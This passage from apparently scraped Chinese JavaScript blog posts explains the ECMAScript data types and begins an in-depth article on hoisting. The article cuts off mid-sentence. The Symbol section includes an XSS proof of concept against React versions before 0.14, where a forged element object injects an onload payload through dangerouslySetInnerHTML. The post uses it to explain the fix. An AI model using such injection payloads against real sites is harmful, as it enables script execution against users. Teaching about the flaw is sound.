a console.log(a) // undefined 用 typeof 也可以得到 &#39;undefined&#39; 這個結果： var a if (typeof a === 'undefined') &#123; // 注意，typeof 的回傳值是字串 console.log('hello') // hello &#125; 2. Null規格上的描述更簡單了： The Null type has exactly one value, called null. (p.72) 有些人會搞不太清楚 null 與 undefined 的差別，因為這兩個確實是有點類似，這時候就要來看一張經典梗圖（出處：推特 @ddprrt）： undefined 基本上就是不存在的意思，而 null 是「存在但沒有東西」，有種刻意用 null 來標記「沒東西」的感覺。 另外，還有一個地方要注意，就是如果用 typeof 的話，你會得到 &#39;object&#39; 這個錯誤的結果： console.log(typeof null) // 'object' 這是 JavaScript 最著名的 bug 之一，在這一篇：The history of “typeof null” 文章中，作者有解釋了為什麼會有這個 bug，並且實際拿出了早期 JavaScript 引擎的程式碼來佐證，而 JavaScript 之父 Brendan Eich 也有在底下留言，修正一些細節。 3. Boolean規格上的描述是： The Boolean type represents a logical entity having two values, called true and false. (p.72) 所以 Boolean 這個型別的值不是 true 就是 false，這大家也應該都滿熟悉的，就不多提了。 4. StringString 在規格上的描述比較長，我們擷取其中一段來看： The String type is the set of all ordered sequences of zero or more 16-bit unsigned integer values (“elements”) up to amaximum length of 2^53 - 1 elements. The String type is generally used to represent textual data in a running ECMAScript program, in which case each element in the String is treated as a UTF-16 code unit value (p.72) 上面寫說字串就是一連串的 16-bit 的數字，而這些數字就是 UTF-16 的 code unit，字串的長度最多則是 2^53 - 1。 相信很多人看了之後可能還是搞不太懂這是什麼意思，有關於 UTF-16 跟字串編碼的東西，可以講的東西很多，之後會額外再寫一篇，目前我們只要大概看過字串的定義就好了。 5. Symbol接著我們來看看 Symbol： The Symbol type is the set of all non-String values that may be used as the key of an Object property. Each possible Symbol value is unique and immutable. Each Symbol value immutably holds an associated value called [[Description]] that is either undefined or a String value. (p.73) Symbol 是 ES6 才新增的資料型別，如同上面所述，是除了字串以外唯一可以當作 object 的 key 的東西，而每一個 Symbol 的值都是獨一無二的。 我們一樣直接來看個範例比較快： var s1 = Symbol() var s2 = Symbol('test') // 可以幫 Symbol 加上敘述以供辨識 var s3 = Symbol('test') console.log(s2 === s3) // false，Symbol 是獨一無二的 console.log(s2.description) // test 用這個可以取得敘述 var obj = &#123;&#125; obj[s2] = 'hello' // 可以當成 key 使用 console.log(obj[s2]) // hello 簡單來說，Symbol 基本上是拿來當物件的 key 用的，因為它獨一無二的特性，所以不會跟其他 key 相衝突。 話雖如此，如果你想要的話還是可以用 Symbol.for() 來取得同樣的 Symbol，像是這樣： var s1 = Symbol.for('a') var s2 = Symbol.for('a') console.log(s1 === s2) // true 為什麼可以做到這樣呢？因為當你在用 Symbol.for 這個 function 的時候，他會先去一個全域的 Symbol registry 尋找有沒有這個 Symbol，如果有的話就回傳，沒有的話就新建一個，然後把建立好的寫入到 Symbol registry 中。因此其實也不是產生同樣的 Symbol，只是幫你找出之前已經建立好的 Symbol 而已。 除此之外，還有一個重要的特性是隱藏資訊，當你在用 for in 的時候，如果 key 是 Symbol 型別，並不會被列出來： var obj = &#123; a: 1, [Symbol.for('hello')]: 2 &#125; for(let key in obj) &#123; console.log(key) // a &#125; 知道了 Symbol 的這些特性以後，你可能會跟我一樣好奇，那實際上 Symbol 到底可以用在哪邊，又該如何使用呢？ 想知道這問題的答案，我們可以來看一個經典的實際案例：React。 如果你有寫過 React 的話，對這樣的寫法應該不陌生： function App() &#123; return ( &lt;div>hello&lt;/div> ) &#125; 這樣子把 JavaScript 跟 HTML 混在一起寫的語法叫做 JSX，而這背後其實是利用 Babel 的 plugin，把上面的程式碼轉換成底下這樣： function App() &#123; return ( React.createElement( 'div', // 標籤 null, // props 'hello' // children ) ) &#125; 而 React.createElement 會回傳一個像是這樣的 object，就是我們平常在講的 Virtual DOM： &#123; type: 'div', props: &#123; children: 'hello' &#125;, key: null, ref: null, _isReactElement: true &#125; 所以其實最後都是 JavaScript，沒什麼特別的，而 React 對於 XSS 都有做基本的防護，所以除非使用 dangerouslySetInnerHTML 這個屬性（名稱是故意設計成這麼長的），否則你是沒辦法插入 HTML 的，例如說這樣： function App(&#123; text &#125;) &#123; return ( &lt;div>&#123;text&#125;&lt;/div> ) &#125; const text = \"&lt;h1>hello&lt;/h1>\" ReactDOM.render( &lt;App text=&#123;text&#125; />, document.body ) 你所傳進去的 text 在放到 DOM 時會用 textContent 的方式放上去，所以最後只會出現純文字的 &lt;h1&gt;hello&lt;/h1&gt;，而不是以 HTML 標籤的形式出現。 好，這些看起來都沒有問題，但如果上面範例的 text 不是文字，而是一個物件的話，會發生什麼事情呢？例如說這樣： function App(&#123; text &#125;) &#123; return ( &lt;div>&#123;text&#125;&lt;/div> ) &#125; const text = &#123; type: 'div', props: &#123; dangerouslySetInnerHTML: &#123; __html: '&lt;svg onload=\"alert(1)\">' &#125; &#125;, key: null, ref: null, _isReactElement: true &#125; ReactDOM.render( &lt;App text=&#123;text&#125; />, document.body ) 由於 React.createElement 最後是回傳一個物件，因此我們可以直接把 text 變成 React.createElement 會回傳的格式，它就會被看成是一個 React component，然後我們就可以控制它的屬性，透過前面提到的 dangerouslySetInnerHTML，來塞入任意的值，進而達成 XSS！ 這就是 React 在 v0.14 以前的漏洞，只要攻擊者可以傳入物件當作參數，並且能夠控制這些屬性，就能達成 XSS。 你可以設想一個狀況，假設某個網站有個設定暱稱的功能，在顯示暱稱的部分，這個網站會去打 API，根據 API 回傳的 response.data.nickname 去 render React component，而 Server 有個 bug 是在設定暱稱時，雖然說照理來講只能填字串，但因為沒有做型態檢查，導致你可以把暱稱設定成物件。 因此，假設你把暱稱設定成物件，就可以像上面那樣設置成一個 React component，在 render 的時候就會觸發 XSS。 那修復方式是什麼呢？很簡單，就是把原本的 _isReactElement 換成 Symbol： const text = &#123; type: 'div', props: &#123; children: 'hello' &#125;, key: null, ref: null, $$typeof: Symbol.for('react.element') &#125; 為什麼這樣就可以了呢？因為根據我們上面設想的狀況，我在把暱稱修改成 object 的時候，$$typeof 傳什麼都不對，都沒辦法是 Symbol.for(&#39;react.element&#39;)，因為 Symbol 的特性就是這樣，我不可能從 Server 端產生出這個值。 除非我可以從 JavaScript 去控制這個 object，但如果我都可以從 JavaScript 去控制它了，那通常就代表我可以執行任意程式碼了（例如說我已經找到 XSS 漏洞） 如此一來，React 就能防範我們上面講的攻擊方式，攻擊者並不能透過一個從 Server 或其他地方來的 object 去偽裝成 React component，因為他偽造不出 Symbol，這就是 Symbol 在實際用途中很重要的一個部分。 Dan 哥的部落格有一篇就是在講這個，上面的內容也是參考自這篇部落格：Why Do React Elements Have a $$typeof Property? 6. NumberNumber 的 spec 也很長，我們簡單看一下： The Number type has exactly 18,437,736,874,454,810,627 (that is, 2^64 - 2^53 + 3) values, representing the double-precision 64-bit format IEEE 754-2019 values as specified in the IEEE Standard for Binary Floating-Point Arithmetic, except that the 9,007,199,254,740,990 (that is, 2^53 - 2) distinct “Not-a-Number” values of the IEEE Standard are represented in ECMAScript as a single special NaN value. (p.76) 裡面有提到了 Number 這個型別有可能的值，是有一個明確數字的，也就是說這個型別並不能完整地儲存所有的數字，一旦超過某個範圍就會有誤差。 再者，規格也寫說它儲存的形式是「double-precision 64-bit format IEEE 754-2019」，有清楚地說明是按照哪一個規格在存，從中也可以看出 JS 中的數字都是 64 bit。 上面講到的範圍是很重要的一個部分，看底下範例比較清楚： var a = 123456789123456789 var b = a + 1 console.log(a === b) // true console.log(a) // 123456789123456780 什麼！為什麼這個數字加一之後居然還是一樣？而且為什麼印出來的並不是我們當初設定的值？仔細想想，其實會發現以 Number 的儲存機制來說，是非常合理的，上面有講到 JS 中的 Number 是個 64 bit 的數字，而 64 bit 是個有限的空間，所以能存的數字當然也是有限的。 這就像鴿籠原理一樣，你有 N 個籠子跟 N+1 隻鴿子，把所有鴿子放到籠子裡面，勢必會有兩隻鴿子在同一個籠子裡。Number 也一樣，儲存空間是有限的，數字是無限的，所以你一定沒辦法精準地儲存所有數字，一定會有誤差產生。 有關於其他細節，我之後會再寫一篇特別講數字的文章來探討一下。 7. BigIntBigInt 是 ES2020 才新增的型別，描述如下： The BigInt type represents an integer value. The value may be any size and is not limited to a particular bit-width. (p.85) 可以看到跟剛剛的 Number 有個很明顯的差別，那就是理論上 BigInt 可以儲存的數字似乎是沒有上限的，從這點也能大概猜出什麼時候該用 BigInt，什麼時候又該用 Number。 剛剛 Number 的例子如果用 BigInt 來改寫，就不會有問題： var a = 123456789123456789n // n 代表 BigInt var b = a + 1n console.log(a === b) // false console.log(a) // 123456789123456789n 這就是為什麼我們需要 BigInt，更多的細節之後會再寫一篇文章來講。 8. Object最後來看看我們的 Object，底下我跳著節錄幾個重點： An Object is logically a collection of properties. Properties are identified using key values. A property key value is either an ECMAScript String value or a Symbol value. All String and Symbol values, including the empty String, are valid as property keys. A property name is a property key that is a String value. Property keys are used to access properties and their values(p.89) 物件是由很多屬性（property）組成，而第二段所說的「key value」其實就是我們常在講的 key，用來取得某個屬性的值。從規格上也可以看出一些很有趣的東西，例如說物件的 key 一定要是字串或是 Symbol，也就是說如果你用數字當作 key，其實背後還是字串： var obj = &#123; 1: 'abc', &#125; console.log(obj[1]) // abc console.log(obj['1']) // abc 而且空字串也可以拿來當作 key，是合法的： var obj = &#123; '': 123 &#125; console.log(obj['']) // 123 物件在 JavaScript 中是個很重要的概念，所以之後會陸續有幾篇文章都在講物件相關的東西。 相信大家都有聽過一個說法，那就是在 JavaScript 裡型別有分兩種，原始型別（Primitive data type）跟物件，基本上除了物件以外的型別都是原始型別。 不過在 ECMAScript spec 中，其實並沒有出現「primitive data type」這個詞，只有出現「primitive values」，例如說： A primitive value is a member of one of the following built-in types: Undefined, Null, Boolean, Number, BigInt, String, and Symbol; an object is a member of the built-in type Object; (p.49) 而「primitive type」這個詞有出現，但只出現了唯一一次： If an object is capable of converting to more than one primitive type, it may use the optional hint preferredType to favour that type (p.112) 網路上能查到最多出現 primitive data type 這個詞的是 Java，雖然 JavaScript spec 中沒有出現，也沒有正式定義「primitive data type」或是「primitive type」（只有 primitive value 有正式定義），但把表示 primitive value 的資料型別稱之為 primitive data type，似乎也滿合理的就是了。 總之這只是一些名詞而已，我只是補充一下在 spec 上的文字，日常使用的時候我覺得講 primitive data type 也無妨。 總結以上就是目前 ECMAScript 2021 spec 中提到的 8 種不同的資料型別，分別是： Undefined Null Boolean String Symbol Number BigInt Object 我稍微介紹了一下每個型別，以及一些從 spec 上看到的小知識，也針對 Symbol 這個型別做了更完整的介紹。 看完這些之後我自己很好奇一個問題，那就是什麼時候會有第九種？如果有的話，最有可能會是什麼？ 我查了一下 TC39 的 proposal，目前似乎只有一個處於 stage 1 的提案有可能新增一個原始型別，叫做 BigDecimal，拿來處理小數用的，就跟 Java 的命名一模一樣。 雖然這個提案還在滿早期的階段，但我認為確實滿有可能在未來被採用，畢竟 JavaScript 目前要精確處理小數還是得靠各種第三方函式庫，就跟以前要處理大數一樣，如果多了原生 API 的支持那也是挺不錯的，不過應該還有滿長的一段路要走。","link":"/2022/02/25/javascript-how-many-types/"},{"title":"我知道你懂 hoisting，可是你了解到多深？","text":"前言2021-06-09 補充： 感謝讀者 blackr1234 留言，此文章為 2018 年 11 月發表，底下程式碼輸出結果大概是以 Node.js v8.17.0 為準，因此對於一些狀況的輸出可能會跟現在不太一樣。例如說存取宣告前的 let 變數，當初的結果為：ReferenceError: a is not defined，現在用 Node.js v14 的結果則是：ReferenceError: Cannot access &#39;a&#39; before initialization。 這陣子我在忙一些教學相關的東西，稍微準備一些資料之後教了學生們 JavaScript 裡面的 hoisting，也就是「提升」這個觀念，例如說以下程式碼： console.log(a) var a = 10 會輸出undefined而不是ReferenceError: a is not defined，這種現象就叫做 Hoisting，變數的宣告被「提升」到最上面去了。 如果你只想了解最基本的 hoisting，其實差不多就是這樣，但後來我還教了let跟const相關的一些知識，不過前一天剛教學完，隔天就立刻看到相關的技術文章還發現自己教錯，因此特別花了一點時間打算好好理解 hoisting 這個東西。 很多東西沒有深入研究的時候你都會覺得沒什麼，真的跳下去深入去看才會發現自己其實還有一大堆概念沒有搞懂。 有很多人都知道 hoisting，但是理解程度卻不盡相同，我列出了 10 個項目，如果有任何一點你剛好不知道的話，那恭喜，這篇文章應該可以為你帶來一些收穫。 你知道什麼是 hoisting 你知道 hoisting 只會提升宣告而非賦值 你知道 function 宣告、function 的參數以及一般變數宣告同時出現時的提升優先順序 你知道 let 跟 const 沒有 hoisting 你知道第四點是錯的，其實有但只是表現形式不一樣 你知道有關第五點，有個概念叫做 TDZ（Temporal Dead Zone） 你看過 ES3 的規格書，知道裡面是怎麼描述的 你看過 ES6 的規格書，知道裡面是怎麼描述的 你知道 hoisting 背後的原理是什麼 你看過 V8 編譯出來的程式碼 你可能會問說：「我為什麼要知道的這麼深？有什麼用？」，其實我也覺得對 hoisting，只要知道基本的就行了。只要你有好好地宣告變數，就算不知道那些，對日常生活或是工作也不會有太大的影響。 可是假如你像我一樣，想要有朝一日在自己的履歷上面放上「精通 JavaScript」的話，那對這些東西就不能逃避。同時你如果對底層的這些細節愈熟悉，會碰到的問題就愈少，也愈能理解為什麼會有 hoisting 的出現，當你想要在技術這條路上走得更遠爬得更高時，我覺得這些細節是很重要的。 接下來，我們就一步步來看 hoisting 吧！ 什麼是 hoisting？在 JavaScript 裡面，如果你試圖去對一個還沒宣告的變數取值，會發生以下錯誤： console.log(a) // ReferenceError: a is not defined 會回傳一個a is not defined的錯誤，因為你還沒宣告這個變數，所以 JavaScript 也找不到這變數在哪，自然就會拋出錯誤。 可是如果你這樣子寫，神奇的事情發生了： console.log(a) // undefined var a 從以前學程式的時候我們就學到了一個觀念，「程式是一行一行跑的」，那既然是一行一行跑的，執行到第一行的時候不是還沒有宣告變數 a 嗎？那為什麼不是拋出a is not defined的錯誤，而是輸出了undefined？ 這種現象就叫做 hoisting，提升，在第二行的var a因為某種原因被「提升」到了最上面，所以上面的程式碼你可以「想像」成這樣： var a console.log(a) // undefined 我會特別強調「想像」，是因為程式碼的位置其實不會被移動，所以不要把提升想成是 JavaScript 引擎幫你把變數宣告都「移動」到最上面，這是有問題的。它背後的原理跟移動程式碼一點關係都沒有。 再來還有一點要特別注意，那就是只有變數的宣告會提升，賦值不會，看看以下範例你就懂了： console.log(a) // undefined var a = 5 上面的程式碼你可以「想像」成這樣： var a console.log(a) // undefined a = 5 你可以把var a = 5這句話分成兩個步驟，第一個階段是宣告變數：var a，第二個階段是賦值：a = 5，只有前面的變數宣告會被提升，賦值不會。 到這邊你可能覺得還行，只是頭腦有一點點混亂，那恭喜你，等一下還有更多東西會讓你更亂，讓我們再把幾個東西加進來，看看能夠搞得多複雜。 如果我們像下面這樣做，會輸出什麼？ function test(v)&#123; console.log(v) var v = 3 &#125; test(10) 簡單嘛，根據剛剛學過的，把上面的程式碼變換成以下形式： function test(v)&#123; var v console.log(v) v = 3 &#125; test(10) 答案是undefined！輕輕鬆鬆。 可是瑞凡，答案是10而不是undefined。 其實變換的過程對了，只是遺漏了一個因素：傳進來的參數。把這個因素加進去以後，可以看成是這樣： function test(v)&#123; var v = 10 // 因為下面呼叫 test(10) var v console.log(v) v = 3 &#125; test(10) 這時候你可能還是會問：「可是我在 log 以前不是重新宣告了一次變數並且沒有給值嗎？那它不是會被覆蓋成undefiend嗎？」 我們再來看一個簡單的小例子： var v = 5 var v console.log(v) 答案會是5而不是undefined，想理解這個行為，你可以再回想一下前面把一個句子分成兩塊，宣告跟賦值，如果我們這樣切分再加上 hoisting 的話，其實上面程式碼可以想像成這樣： var v var v v = 5 console.log(v) 這樣你就知道為什麼答案是 5 了。 此時的你應該覺得頭腦有點快爆炸了，為什麼這麼多規則要記？別擔心，我們還有最後一個例子，保證讓你叫苦連天。 console.log(a) //[Function: a] var a function a()&#123;&#125; 除了變數宣告以外，function 的宣告也會提升而且優先權比較高，因此上面的程式碼會輸出function而不是undefined。 好，基本的 hoisting 概念就到這邊結束了，幫你畫一下重點： 變數宣告跟函式宣告都會提升 只有宣告會提升，賦值不會提升 別忘了函式裡面還有傳進來的參數 別急，還有 ES6 新增的 let 跟 const 沒有講。 let 跟 const 與 hoisting在 ES6 裡面我們有了新的兩個宣告變數的關鍵字，let 與 const，這兩個對 hoisting 的行為是差不多的，因此我下面只拿 let 來舉例，可以看一下以下程式碼： console.log(a) // ReferenceError: a is not defined let a 謝天謝地，終於沒有那麼多規則要記了！ 從以上程式碼看起來，let 與 const 應該是沒有變數提升吧，否則就不會拋出這個 Error 了。 我之前也是很天真這樣想的，直到我看到以下範例： var a = 10 function test()&#123; console.log(a) let a &#125; test() 如果 let 真的沒有 hoisting 的話，答案應該會輸出10，因為 log 那一行會存取到外面的var a = 10的這個變數，可是！！！ 答案卻是：ReferenceError: a is not defined。 意思就是，它的確提升了，只是提升後的行為跟 var 比較不一樣，所以乍看之下你會以為它沒有提升。 這個觀念我們會在之後詳細講解，但在這之前我們先做個簡單的總結。 有很多提到 hoisting 的文章，講到這邊就差不多了，就大概講一些 hoisting 的行為以及 let 與 const 的不同之處，但我覺得只講到這裡其實是很可惜的一件事情。 因為如果你只理解到這個程度，就會以為 hoisting 不過就是一大堆複雜的規則要記，根本沒什麼，誰能夠記這麼多規則？不就是背書而已嗎？ 這是因為上面那些只讓你理解了「表面」，舉出幾個不同的例子跟你說會有這樣的行為發生，可是卻沒有跟你說「為什麼會這樣」，或者是「實際上是怎麼運作的」，若是你想真正了解 hoisting 是什麼，必須要找出以下兩個問題的答案，一但找出了，保證你任督二脈直接被打通： 為什麼我們需要 hoisting？ Hoisting 到底是怎麼運作的？ 為什麼我們需要 hoisting？在問這樣的一個問題時，其實你可以反過來想：「如果我們沒有 hoisting 會怎樣？」 第一，我們一定要先宣告變數才可以使用。 這點其實很不錯，畢竟這是一個好習慣。 第二，我們一定要先宣告函式才可以使用。 這一點就不太好了，很不方便，如果是這樣的話那可能在每個檔案你都必須把 function 宣告放到最上面去，才能保證你底下的程式碼都可以 call 到這些 function。 第三，沒有辦法達成 function 互相呼叫。 舉個例子： function loop(n)&#123; if (n>1) &#123; logEvenOrOdd(--n) &#125; &#125; function logEvenOrOdd(n) &#123; console.log(n, n % 2 ? 'Odd' : 'Even') loop(n) &#125; loop(10) 我們在loop裡面呼叫logEvenOrOdd，在logEvenOrOdd裡面也呼叫loop，如果我們沒有 hoisting，那以上的程式碼就不可能達成，因為你不可能同時做到 A 在 B 上面而 B 又在 A 上面。 所以為什麼我們需要 hoisting？就是為了要解決上面的問題。 為了增添這一個說法的正確性，我引用一篇文章給大家看，在 Note 4. Two words about “hoisting”. 裡面有提到作者發了個 Twitter 問說 hoisting 的目的到底是什麼，然後 JavaScript 的作者有出來回應，以下是文章裡面附的原文跟回應： By the way, recently I raised this topic on Twitter and also mentioned as one of the reasons the mutual recursion. Brendan Eich also gave an acknowledgment that FDs hoisting is “for mutual recursion &amp; generally to avoid painful bottom-up ML-like order”. 如果想看完整對話截圖，可以看這篇文章：JavaScript系列文章：变量提升和函数提升，最下面有附。 hoisting 到底是怎麼運作的？現在我們知道了什麼是 hoisting，知道了為什麼需要 hoisting，接著就是欠缺的最後一塊拼圖了：到底 hoisting 是怎麼運作的？ 要回答這個問題，最好的方法就是去找 ECMAScript 的規格書來看，就像你今天想研究型別轉換的問題，解法一樣是去找規格書來看，理由很簡單，因為那些規則都清清楚楚寫在上面了。 ECMAScript 有很多版本，越後面的版本規格越多，所以為了方便起見，我們底下用 ES3 當作範例。 如果你看過 ES3 的規則，會發現用 hoisting 當關鍵字完全找不到東西，而與 hoisting 這現象有關的段落其實在第十章：Execution Contexts。 這邊先非常簡單介紹一下什麼是 Execution Contexts（以下簡稱 EC），每當你進入一個 function 的時候，就會產生一個 EC，裡面儲存跟這個 function 有關的一些資訊，並且把這個 EC 放到 stack 裡面，當 function 執行完以後，就會把 EC 給 pop 出來。 示意圖大概就像這樣，要記得除了 function 有 EC 以外，還有一個 global EC： （來源：https://medium.freecodecamp.org/lets-learn-javascript-closures-66feb44f6a44） 簡而言之呢，所有 function 需要的資訊都會存在 EC，也就是執行環境裡面，你要什麼都去那邊拿就對了。 ECMAScript 是這樣描述的： When control is transferred to ECMAScript executable code, control is entering an execution context. Active execution contexts logically form a stack. The top execution context on this logical stack is the running execution context. 再來就是重點了，在10.1.3 Variable Instantiation的地方是這樣寫的： Every execution context has associated with it a variable object. Variables and functions declared in the source text are added as properties of the variable object. For function code, parameters are added as properties of the variable object. 每個 EC 都會有相對應的 variable object（以下簡稱 VO），在裡面宣告的變數跟函式都會被加進 VO 裡面，如果是 function，那參數也會被加到 VO 裡。 首先，你可以把 VO 想像成就是一個 JavaScript 的物件就好。 再來，VO 什麼時候會用到？你在存取值的時候會用到，例如說 var a = 10 這一句，之前有講過可以分成左右兩塊： var a：去 VO 裡面新增一個屬性叫做 a（如果沒有 a 這個屬性的話）並初始化成 undefined a = 10：先在 VO 裡面找到叫做 a 的屬性，找到之後設定為 10 （這邊如果 VO 裡面找不到怎麼辦？它會透過 scope chain 不斷往上尋找，如果每一層都找不到就會拋出錯誤。至於尋找跟建立 scope chain 的過程雖然與本文有關但可以講得太多了，額外再開一篇會比較適合，這邊就先不提了） 接著來看下一段： Which object is used as the variable object and what attributes are used for the properties depends on the type of code, but the remainder of the behaviour is generic. On entering an execution context, the properties are bound to the variable object in the following order: 最精華的只有這一句：「On entering an execution context, the properties are bound to the variable object in the following order」，在進入 EC 的時候，會按照以下順序把東西放到 VO 裡面： 下面的段落有點長，我節錄一下： For function code: for each formal parameter, as defined in the FormalParameterList, create a property of the variable object whose name is the Identifier and whose attributes are determined by the type of code. The values of the parameters are supplied by the caller as arguments to [[Call]]. If the caller supplies fewer parameter values than there are formal parameters, the extra formal parameters have value undefined 簡單來說就是對於參數，它會直接被放到 VO 裡面去，如果有些參數沒有值的話，那它的值會被初始化成 undefined。 舉例來說，假設我 function 長這樣： function test(a, b, c) &#123;&#125; test(10) 那我的 VO 就長這樣： &#123; a: 10, b: undefined, c: undefined &#125; 所以參數是第一個優先順序，再來我們看第二個： For each FunctionDeclaration in the code, in source text order, create a property of the variable object whose name is the Identifier in the FunctionDeclaration, whose value is the result returned by creating a Function object as described in 13, and whose attributes are determined by the type of code. If the variable object already has a property with this name, replace its value and attributes. Semantically, this step must follow the creation of FormalParameterList properties. 對於 function 的宣告，一樣在 VO 裡面新增一個屬性，至於值的話就是建立 function 完之後回傳的東西（可以想成就是一個指向 function 的指標就好）。 再來是重點：「如果 VO 裡面已經有同名的屬性，就把它覆蓋掉」，舉個小例子： function test(a)&#123; function a()&#123;&#125; &#125; test(1) VO 會長的像這樣，原本的參數a被覆蓋掉了： &#123; a: function a &#125; 最後來看對於變數的宣告該怎麼處理： For each VariableDeclaration or VariableDeclarationNoIn in the code, create a property of the variable object whose name is the Identifier in the VariableDeclaration or VariableDeclarationNoIn, whose value is undefined and whose attributes are determined by the type of code. If there is already a property of the variable object with the name of a declared variable, the value of the property and its attributes are not changed. Semantically, this step must follow the creation of the FormalParameterList and FunctionDeclaration properties. In particular, if a declared variable has the same name as a declared function or formal parameter, the variable declaration does not disturb the existing property. 對於變數，在 VO 裡面新增一個屬性並且把值設為 undefined，再來是重點：「如果 VO 已經有這個屬性的話，值不會被改變」 來重新整理一下，當我們在進入一個 EC 的時候（你可以把它想成就是在執行 function 後，但還沒開始跑 function 內部的程式碼以前），會按照順序做以下三件事： 把參數放到 VO 裡面並設定好值，傳什麼進來就是什麼，沒有值的設成 undefined 把 function 宣告放到 VO 裡，如果已經有同名的就覆蓋掉 把變數宣告放到 VO 裡，如果已經有同名的則忽略 在你看完規格並且稍微理解以後，你就可以用這個理論來解釋我們前面看過的程式碼了： function test(v)&#123; console.log(v) var v = 3 &#125; test(10) 每個 function 你都可以想成其實執行有兩個階段，第一個階段是進入 EC，第二個階段才是真的一行行執行程式。 在進入 EC 的時候開始建立 VO，因為有傳參數進去，所以先把 v 放到 VO 並且值設定為 10，再來對於裡面的變數宣告，VO 裡面已經有 v 這個屬性了，所以忽略不管，因此 VO 就長這樣子： &#123; v: 10 &#125; 進入 EC 接著建立完 VO 以後，才開始一行行執行，這也是為什麼你在第二行時會印出 10 的緣故，因為在那個時間點 VO 裡面的 v 的確就是 10 沒錯。 如果你把程式碼換成這樣： function test(v)&#123; console.log(v) var v = 3 console.log(v) &#125; test(10) 那第二個印出的 log 就會是 3，因為執行完第三行以後， VO 裡面的值被換成 3 了。 以上就是 ES3 的規格書裡面提到的執行流程，你只要記得這個執行流程，碰到任何關於 hoisting 的題目都不用怕，你按照規格書的方法去跑絕對沒錯。 當我知道了這一段執行流程以後，第一個感想是豁然開朗，覺得 hoisting 不再是什麼神秘的東西，你只要假裝自己是 JS 引擎，跟著跑就好。第二個感想是，JS 到底怎麼做到的？ 編譯與直譯：JS 引擎到底怎麼運作的？還記得我上面的時候有提過，以前學程式的時候一直有個概念，那就是「直譯」代表程式是一行行跑的，而 JS 作為一個直譯的語言，不是也該一行行跑嗎？ 可是如果真的一行行跑，那怎麼可能達成 hoisting 這個功能？你在執行第 n 行的時候根本不知道 n + 1 行是什麼，想提升是不可能的。 針對這個疑惑我上網找了很久的資料，最後找到一篇的說法我覺得滿合理的：虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩。 裡面提到了幾點我覺得寫得非常不錯，有破除了我滿多以前的迷思： 第一，語言一般只會定義抽象語義，不會強制用某種方式實現，像是 C 我們會說它是編譯型語言，可是 C 也有直譯器。所以當我們在說某種程式語言是直譯或編譯型的時候，其實是在指涉「大多數」而不是全部。 換言之，我們說 JavaScript 是直譯型語言，不代表 JavaScript 不能有編譯器，反之亦然。 第二，直譯器跟編譯器最大的差別在於「執行」。 編譯這個步驟就是把原始碼 A 編譯為目的碼 B，就這樣而已，但你要保證 A 跟 B 執行完的結果要相同。 而直譯就是你輸入原始碼 A，輸出就直接是你程式碼裡面要執行的語義，裡面怎麼做的是一個黑箱子。 原文裡面有一張圖畫得很不錯： 所以直譯器裡面也能有編譯，這是不衝突的，或是你也可以寫一個超簡單直譯器，就是你輸入原始碼以後幫你編譯完然後執行。 事實上很多種直譯器內部的運作方式都是先把原始碼編譯成某種中間碼再去執行，所以編譯這個步驟還是很常見的，而 JS 也是這樣運作的。 當你拋開以前那種「JS 就是要一行行執行」的舊觀念並擁抱「其實主流 JS 引擎都有編譯這個步驟」的想法後，你就不會覺得 hoisting 是無法達成的事情了。 前面我們已經有看規格，知道在 ES3 裡面的運行模式並且知道 VO 這個東西，但規格裡面描述的也只是抽象的東西，它並沒有寫說「實際上」是在哪個地方做處理的，而這地方其實就是編譯階段。 話說關於這個編譯直譯的問題其實我卡滿久的，因為以前觀念不正確的地方很多，現在慢慢把它修正過來，而對於 hoisting 其實我之前有點分不清楚規格跟實作的差別，後來還跑去問了You-Dont-Know-JS 的作者，也很幸運地得到回覆，有興趣的人可以看看：https://github.com/getify/You-Dont-Know-JS/issues/1375。 JS 引擎的運作如同我上面所說的，其實現在主流 JS 引擎內部都會有編譯這個階段，而 hoisting 其實就是在編譯這個階段做處理的。引入了編譯階段以後，可以把 JS 分成編譯階段跟執行階段兩個步驟。 在編譯階段的時候，會處理好所有的變數及函式宣告並且加入到 scope 裡面，在執行的時候就一樣可以去使用它。詳細情形這一篇寫得很好：Hoisting in JavaScript ，我下面就直接改一下裡面的程式碼當做例子。 舉例來說，我有這樣一段程式碼： var foo = \"bar\" var a = 1 function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d) &#125; bar() 在編譯階段的時候會處理宣告的部分，所以會是這樣： Line 1：global scope，我要宣告一個變數叫做 foo Line 2：global scope，我要宣告一個變數叫做 a Line 3：global scope，我要宣告一個函式叫做 bar Line 4：沒有任何變數宣告，不做事 Line 5：bar scope，我要宣告一個變數叫做 a Line 6：沒有任何變數宣告，不做事 Line 7：沒有任何變數宣告，不做事 Line 8：沒有任何變數宣告，不做事 處理完後的東西差不多就長這樣： globalScope: &#123; foo: undefined, a: undefined, bar: function &#125; barScope: &#123; a: undefined &#125; 再來進入到執行階段，這邊有兩個專有名詞先記一下，在介紹之前我先給一個範例會比較好理解： var a = 10 console.log(a) 上面這兩行有個差異，第一行的時候我們只需要知道「a 的記憶體位置在哪裡」就好，我們不關心它的值是什麼。 而第二行則是「我們只關心它的值是什麼，把值給我就好」，所以儘管兩行裡面都有a，但你可以看出來他們所要做的事情是不一樣的。 而第一行的 a 我們叫它 LHS（Left hand side）引用，第二行叫它 RHS（Right hand side）引用，這邊的 left 跟 right 指的是相對於等號的左右邊，但用這種方式理解的話其實不夠精確，因此像下面這樣記就好： LHS：請幫我去查這個變數的位置在哪裡，因為我要對它賦值。RHS：請幫我查詢這個變數的值是什麼，因為我要用這個值。 有了這個概念以後，再看一次上面的範例程式碼，就可以一步一步來解釋： var foo = \"bar\" var a = 1 function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d) &#125; bar() Line 1：var foo &#x3D; “bar”JS 引擎：global scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功找到 foo 並且賦值 這時候的 global scope： &#123; foo: \"bar\", a: undefined, bar: function &#125; Line 2：var a &#x3D; 1JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功找到 a 並且賦值 這時候的 global scope： &#123; foo: \"bar\", a: 1, bar: function &#125; Line 10：bar()JS 引擎：global scope，我這裡有個對 bar 的 RHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功返回 bar 的值並且呼叫 function Line 4：foo &#x3D; “inside bar”JS 引擎：bar scope，我這裡有個對 foo 的 LHS 引用，你有看過它嗎？執行結果：bar scope 說沒有，所以去問上一層的 global 